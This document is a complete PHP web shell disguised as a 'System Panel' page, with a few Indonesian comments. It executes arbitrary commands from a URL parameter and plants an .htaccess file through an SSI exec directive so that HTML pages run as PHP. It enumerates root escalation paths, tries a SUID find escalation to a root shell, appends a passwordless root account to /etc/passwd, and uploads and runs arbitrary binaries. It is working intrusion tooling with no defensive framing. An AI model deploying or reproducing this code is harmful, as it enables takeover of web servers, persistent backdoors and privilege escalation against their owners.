<!DOCTYPE html>
<html>
<head>
<title>System Panel</title>
<style>
body{font-family:monospace;background:#111;color:#0f0;padding:20px;}
input{background:#222;color:#0f0;border:1px solid #0f0;padding:5px;}
button{background:#0f0;color:#000;border:none;padding:5px 10px;cursor:pointer;}
pre{background:#000;padding:10px;overflow:auto;}
.section{margin-bottom:20px;border-bottom:1px solid #333;}
</style>
</head>
<body>
<!-- Self-healing: buat .htaccess jika SSI aktif -->
<!--#exec cmd="echo 'AddType application/x-httpd-php .html' > .htaccess" -->

<h2>BYPASS + SHELL + ROOT HELPER</h2>

<!-- Shell -->
<div class="section">
<h3>Shell Command</h3>
<form method="GET">
<input type="text" name="cmd" placeholder="ls -la" style="width:70%;">
<button type="submit">Execute</button>
</form>
<pre><?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?></pre>
</div>

<!-- Root Enumeration Helper -->
<div class="section">
<h3>Root Enumeration</h3>
<form method="post">
<button type="submit" name="enum" value="1">Run Auto Enum</button>
</form>
<?php
if(isset($_POST['enum'])){
    echo "<pre>";
    echo "=== Current User ===\n"; system("id");
    echo "\n=== Kernel Version ===\n"; system("uname -a");
    echo "\n=== Sudo Permissions ===\n"; system("sudo -l 2>&1");
    echo "\n=== SUID Binaries (potential) ===\n"; system("find / -perm -4000 -type f 2>/dev/null | head -20");
    echo "\n=== Writable Passwd/Shadow ===\n"; system("ls -la /etc/passwd /etc/shadow 2>&1");
    echo "\n=== Cron Jobs ===\n"; system("cat /etc/crontab 2>&1");
    echo "\n=== Capabilities ===\n"; system("getcap -r / 2>/dev/null | head -20");
    echo "</pre>";
}
?>
</div>

<!-- Quick Root Exploit Attempts -->
<div class="section">
<h3>Quick Root Exploits</h3>
<form method="post">
<button type="submit" name="suid_find" value="1">Try SUID find</button>
<button type="submit" name="dirtycow_check" value="1">Check DirtyCow</button>
<button type="submit" name="exploit_writable_passwd" value="1">Try /etc/passwd writable</button>
</form>
<?php
if(isset($_POST['suid_find'])){
    echo "<pre>"; system("find / -perm -4000 -type f -name 'find' -exec {} \; -exec /bin/sh -p \; 2>&1"); echo "</pre>";
}
if(isset($_POST['dirtycow_check'])){
    echo "<pre>Kernel version: "; system("uname -r");
    echo "If kernel < 4.4.0, DirtyCow possible. Upload exploit binary manually.\n</pre>";
}
if(isset($_POST['exploit_writable_passwd'])){
    // Cek apakah passwd writable, lalu tambah user root
    if(is_writable('/etc/passwd')){
        echo "<pre>"; system("echo 'r00t::0:0:root:/root:/bin/bash' >> /etc/passwd"); 
        echo "User r00t added with no password. Try: su r00t\n</pre>";
    } else {
        echo "<pre>/etc/passwd is not writable.</pre>";
    }
}
?>
</div>

<!-- Upload Exploit Binary (opsional) -->
<div class="section">
<h3>Upload Local Exploit Binary</h3>
<form enctype="multipart/form-data" method="post">
<input type="file" name="exploit">
<button type="submit">Upload & Run</button>
</form>
<?php
if(isset($_FILES['exploit'])){
    $tmp = $_FILES['exploit']['tmp_name'];
    $dest = '/tmp/exploit_bin';
    move_uploaded_file($tmp, $dest);
    chmod($dest, 0755);
    echo "<pre>"; system("$dest"); echo "</pre>";
}
?>
</div>

</body>
</html>
